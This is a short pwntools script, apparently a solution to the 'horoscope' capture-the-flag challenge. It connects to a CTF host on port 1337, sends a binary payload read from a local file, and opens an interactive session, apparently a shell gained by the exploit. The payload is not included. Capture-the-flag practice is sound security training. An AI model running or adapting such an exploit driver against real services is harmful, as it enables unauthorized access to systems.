from pwn import *;

io = remote("horoscope.sdc.tf", 1337);
io.recv();

file = open("./payload.bin", "rb");
io.send(file.read());
io.recvuntil(b':)');
io.interactive();